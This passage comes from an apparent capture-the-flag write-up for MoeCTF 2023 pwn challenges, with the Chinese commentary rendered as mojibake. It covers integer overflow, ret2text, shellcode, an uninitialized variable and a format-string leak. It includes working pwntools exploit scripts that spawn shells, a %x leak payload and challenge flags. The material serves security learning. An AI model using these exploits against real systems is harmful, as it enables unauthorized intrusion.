class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know fd?&quot;</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;./flag&quot;</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  new_fd = (<span class="number">4</span> * fd) | <span class="number">0x29A</span>;</span><br><span class="line">  dup2(fd, new_fd);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which file do you want to read?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input its fd: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  read(input, flag, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;3H1lDl8GIZHEi0_IWpA4krCAChNI3bpd&#125;</span><br></pre></td></tr></table></figure>



<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/">https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/</a></p>
<p>int32æº¢å‡ºçš„åŸç†æ˜¯è¿›ä½çš„æ—¶å€™æŠŠæœ€é«˜ä½çš„æ­£è´Ÿç¬¦å·ä½æ”¹å˜äº†ï¼Œæ‰€ä»¥å˜æˆè´Ÿæ•°äº†ã€‚</p>
<p>æ‰€ä»¥è¦è®¡ç®—å˜æˆ-114514ï¼Œè¦æ˜ç™½ i32çš„å¤§å°èŒƒå›´ 2**31 -1ã€‚-1æ˜¯å› ä¸ºæœ‰ä¸ª0</p>
<p>æ‰€ä»¥åªéœ€è¦è®¡ç®—2**32 - 114514 å°±èƒ½æ±‚å‡ºæº¢å‡ºåˆ°-114514éœ€è¦è¾“å…¥å¤šå°‘ï¼Œå¾—åˆ°4294852782</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Moectf2023.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know int overflow?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you make n == -114514 but no &#x27;-&#x27; when you input n.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input n:&quot;</span>);</span><br><span class="line">  get_input(&amp;n);</span><br><span class="line">  <span class="keyword">if</span> ( n == <span class="number">-114514</span> )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe you should search and learn it.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;6iD1QTUJSScIKT-_6vm-6nWQs8GvJK6-&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text_32"></a>ret2text_32</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">84</span>]; <span class="comment">// [esp+10h] [ebp-58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my stack in MoeCTF2023!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your age?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now..try to overflow!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¨‹åºé‡Œé¢æœ‰plt systemçš„ï¼Œæœ‰ä¸ª&#x2F;bin&#x2F;shçš„gadget<br>è¿™é‡Œåªéœ€è¦è®¡ç®—bufåˆ°è¿”å›åœ°å€çš„è·ç¦»ï¼Œsystemå¡«å……æ ˆåº•ä¸‹çš„è¿”å›åœ°å€ï¼Œç„¶åå¡«å……systemçš„è¿”å›åœ°å€è¿˜æœ‰&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œå°±èƒ½å°†&#x2F;bin&#x2F;shä¼ å‚åˆ°system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">58873</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line = p.recvline() ;<span class="built_in">print</span>(line) <span class="comment"># Welcome to my stack in MoeCTF2023!</span></span><br><span class="line">line = p.recvline() ;<span class="built_in">print</span>(line) <span class="comment"># What&#x27;s your age?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x8049070</span> <span class="comment"># plt func system</span></span><br><span class="line">command_addr = <span class="number">0x804c02c</span> <span class="comment"># /bin/sh addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = char buf[84] + var_4 4 byte = s ; s + 4 = r</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">84</span> + <span class="number">4</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">b&#x27;C&#x27;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(command_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">line = p.recvline() ;<span class="built_in">print</span>(line) <span class="comment"># What&#x27;s your age?</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;eV9akrlQlwtJVvpBAk45YMO18UHvBv4n&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text_64"></a>ret2text_64</h2><p>å’±æ˜¯ç¬¨è›‹ï¼Œå› ä¸º64ä½æ ˆå¯¹é½æƒ³äº†å¥½ä¹… <a target="_blank" rel="noopener" href="https://blog.csdn.net/hu_c_t_f/article/details/131902515">https://blog.csdn.net/hu_c_t_f/article/details/131902515</a></p>
<p>64ä½ä½¿ç”¨rdiä¼ ç¬¬ä¸€ä¸ªå‚æ•° ä¼ å‚çš„é¡ºåºåˆ†åˆ«æ˜¯rdi rsi rdx rcx r8 r9ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸€ä¸ªpop rdi retçš„gadget</p>
<p>ä½¿ç”¨ROPgadget â€“binary pwn | grep pop | grep rdi å°±èƒ½ç­›é€‰</p>
<p>offset + ret + gadget + &#x2F;bin&#x2F;sh + func system()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="number">50215</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">line =  p.recvline() ;<span class="built_in">print</span>(line)</span><br><span class="line">line =  p.recvline() ;<span class="built_in">print</span>(line)</span><br><span class="line">line =  p.recvline() ;<span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">string_addr = <span class="number">0x404050</span> <span class="comment"># bin/sh address</span></span><br><span class="line">gadget_addr = <span class="number">0x4011be</span>   <span class="comment"># pop rdi ret</span></span><br><span class="line">system_addr = <span class="number">0x401090</span> <span class="comment"># system(char * command) address</span></span><br><span class="line">ret_addr = <span class="number">0x040101a</span> <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span> + <span class="number">8</span>) <span class="comment"># offset buf[80] + 8 = r</span></span><br><span class="line">payload += p64(ret_addr) <span class="comment">#64ä½ gadgetä¸­æœ‰ä¸ªret æ¶ˆè€—äº†8å­—èŠ‚ï¼Œè¿™é‡Œéœ€è¦å†retä¸€æ¬¡ä¿æŒæ ˆå¯¹é½</span></span><br><span class="line">payload += p64(gadget_addr)</span><br><span class="line">payload += p64(string_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line"></span><br><span class="line">line =  p.recvline() ;<span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;KsAymn0LqrzuRUcO3QI71N_u3UzZz1m7&#125;</span><br></pre></td></tr></table></figure>



<h2 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h2><p>è¿™é‡Œçš„æ„æ€æ˜¯ï¼Œæˆ‘ä¼ è¿›å»çš„æ•°æ®ä¼šå…ˆæ”¾åˆ°rbp+var_70çš„ä½ç½®ï¼Œç„¶åä¸‹é¢ä¼šcallæˆ‘ä¼ è¿›å»çš„æ•°æ®ï¼ŒæŸ¥è¯¢äº†ä¸€ä¸‹ç„¶åæ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œæˆ‘åªéœ€è¦ç”¨pwntoolsä¸­çš„shellcraftæ¥ç”Ÿæˆshellcodeç„¶åsendlineè¿‡å»å°±å¥½äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+var_70]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _gets</span><br><span class="line">lea     rax, [rbp+var_70]</span><br><span class="line">mov     [rbp+var_78], rax</span><br><span class="line">mov     rdx, [rbp+var_78]</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    rdx</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.1.111&quot;</span></span><br><span class="line">port = <span class="number">58988</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode_level0&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode  =  asm(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦å…ˆè®¾ç½®ä¸€ä¸‹contextå‡½æ•°ï¼Œè®¾ç½®å¥½å¹³å°å†ç”Ÿæˆshellcode sendlineè¿‡å»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;ddP0bHRsw_l0B6HQnDFtG62TOXAVXFv6&#125;</span><br></pre></td></tr></table></figure>



<h2 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h2><p>mmapå’Œmprotectå‡½æ•°æ˜¯å¹²å˜›ç”¨çš„ï¼Ÿæˆ‘çš„shellcodeæ€ä¹ˆæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Ÿ</p>
<p>mmapæ˜¯ç±»ä¼¼äºmallocä½†æ˜¯å¯ä»¥æŒ‡å®šå†…å­˜çš„è¯»å†™æ‰§è¡Œæƒé™æ˜¯æ€ä¹ˆæ ·çš„ï¼Œç„¶åmprotectæ˜¯åœ¨å·²ç»åˆ†é…å¥½çš„å†…å­˜ä¸Šé¢ä¿®æ”¹å†…å­˜çš„æƒé™</p>
<p>åœ¨case4é‡Œé¢7çš„æ„æ€æ˜¯PROT_READ | PROT_WRITE | PROT_EXEC çš„ç»“æœï¼Œå¯è¯»å¯å†™å¯æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">mprotect(paper4, 0x1000uLL, 7);</span><br></pre></td></tr></table></figure>

<p>ç„¶ååªéœ€è¦case4 shellcodeå°±æ²¡é—®é¢˜äº†ï¼Œpwntoolsè„šæœ¬æ˜¯è¿™æ ·å†™çš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> posixpath</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.129.194&quot;</span></span><br><span class="line">port = <span class="number">57941</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode_level1&quot;)</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># Which paper will you choose?</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>) <span class="comment"># mprotect(paper4, 0x1000uLL, 7);</span></span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line) <span class="comment"># what do you want to write?</span></span><br><span class="line"></span><br><span class="line">shellcode  =  asm(shellcraft.sh()) ; payload = shellcode</span><br><span class="line">p.sendline(payload) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> age; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  age = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your age:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;age);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your age is %d.\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_key</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> key; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your key:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%5d&quot;</span>, &amp;key);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is my flag.&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>keyå’Œageåœ¨æ ˆä¸­çš„åœ°å€ä¸€æ ·çš„ï¼Œæ‰€ä»¥åªéœ€è¦åœ¨get_nameä¸­è®¾ç½®ageå˜é‡ä¸º114514ï¼Œç„¶åscanfè¿™é‡Œè¾“å…¥ä¸€ä¸ªéæ•°å­—çš„ç¬¦å·ï¼Œå°±ä¸ä¼šåˆå§‹åŒ–ï¼Œæ¯”å¦‚è¯´&#x3D;å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;V5glae83rq6G1nSbZa6pGtWaflnHjE1U&#125;</span><br></pre></td></tr></table></figure>



<h2 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-B0h]</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">80</span>]; <span class="comment">// [esp+4h] [ebp-ACh] BYREF</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">80</span>]; <span class="comment">// [esp+54h] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+A4h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+A8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">  fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;open flag error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, flag, <span class="number">0x50</span>u);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœç´¢åå‘ç° printf(name)è¿™é‡Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨%xæ¥æ³„éœ²æ ˆä¸Šçš„æ•°æ®ï¼Œæ²¡æœ‰åŠ å‚æ•°åˆ—è¡¨ä¼¼ä¹æ˜¯ä»æ ˆèµ·å§‹åœ°å€å¼€å§‹è¯»ï¼Œ%xæ˜¯ä»¥16è¿›åˆ¶è¾“å‡ºæ•°æ®ï¼Œ32ä½æ˜¯4å­—èŠ‚ã€‚</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x</span><br></pre></td></tr></table></figure>

<p>linuxä¸Šæ˜¯å°ç«¯åºå­˜å‚¨ï¼Œæ‰€ä»¥éœ€è¦åè½¬ä¸€ä¸‹å˜æˆå¤§ç«¯åºæ˜¾ç¤º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;ff886d4c.50.56648362.ff886e74.0.3.63656f6d.617b6674.4c4c5059.67426344.6e577272.70453348.484b5041.784f3151.64774731.7d515737.a.0.0.0.0.0.0.0.0.0.252e7825&quot;</span></span><br><span class="line">flag = flag.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">segment</span>):</span><br><span class="line">    <span class="keyword">return</span> segment[<span class="number">6</span>:<span class="number">8</span>] + segment[<span class="number">4</span>:<span class="number">6</span>] + segment[<span class="number">2</span>:<span class="number">4</span>] + segment[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">decoded_str_big_endian = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">bytes</span>.fromhex(convert(flag)).decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">for</span> flag <span class="keyword">in</span> flag <span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decoded_str_big_endian)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;aYPLLDcBgrrWnH3EpAPKHQ1Ox1Gwd7WQ&#125;</span><br></pre></td></tr></table></figure>



<h2 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h2><p>æŸ¥è¯¢äº†ä¸€ä¸‹PIEæ˜¯ä¸€ç§ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶å€™éƒ½èƒ½åŠ è½½åˆ°ä¸åŒå†…å­˜åœ°å€çš„æŠ€æœ¯ï¼Œæ¯æ¬¡åŠ è½½æ•´ä¸ªç¨‹åºä¸­çš„ä»£ç æ•°æ®å’Œå †æ ˆéƒ½ä¼šéšæœºåŒ–</p>
<p>ç„¶åè¿™é‡ŒæŠŠvulnå‡½æ•°çš„åœ°å€æ‰“å°äº†å‡ºæ¥ï¼ŒæŸ¥è¯¢èµ„æ–™åå‘ç°ï¼Œpieæ˜¯åŸºåœ°å€ä¼šå˜ï¼Œä½†æ˜¯åç§»åœ°å€æ˜¯ä¸å˜çš„ï¼Œå¯ä»¥ç”¨è¿™é‡Œæ‰“å°çš„vulnçš„åœ°å€è®¡ç®—å‡ºåŸºåœ°å€ç„¶åç”¨åç§»åœ°å€æ¥ç¡®å®šæ•°æ®å’Œå‡½æ•°çš„ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time i will give u a gift!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Vuln&#x27;s address is:%p\n&quot;</span>, vuln);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

